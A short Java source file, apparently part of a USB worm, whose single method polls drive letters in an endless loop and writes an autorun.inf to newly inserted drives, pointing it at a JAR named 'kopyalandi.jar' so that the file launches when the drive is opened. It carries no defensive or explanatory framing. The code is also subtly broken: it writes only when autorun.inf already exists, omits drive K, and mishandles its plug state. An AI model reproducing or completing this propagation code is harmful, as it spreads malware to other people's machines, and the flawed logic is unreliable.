
package shrub;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;



/**
 *
 * @author DarkShrub
 */

public class exTRa {
public void createAutorun()
{
    String[] letters=new String[]{"A", "B","C","D","E", "F", "G", "H", "I", "J", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"};
    File[] disks=new File[letters.length];
    boolean[] reads= new boolean[disks.length];
  
     for(int i=0;i<letters.length;i++)
        {
            disks[i] = new File(letters[i] + ":\\");
        boolean plugIn=disks[i].canRead();
        }
    while (true) {        
        for (int i = 0; i < letters.length; ++i) {

                boolean pluggedIn = disks[i].canRead();

                if (pluggedIn != reads[i]) {
                
                    if (pluggedIn) {
                        File run=new File(letters[i]+":\\autorun.inf");
                        try {
                            if (run.exists()) {
                                run.createNewFile();
                               BufferedWriter inf = new BufferedWriter(new FileWriter(run));
                               inf.write("[autorun] \n");
                                inf.write("open=kopyalandi.jar");
                                inf.flush();
                                inf.close();
                            }
                        } catch (Exception e) {
                        }
                    }
                    else reads[i]=pluggedIn;
                }
        }
        try {
                    Thread.sleep(100);
                } catch (InterruptedException e) {
                }
    }
}
}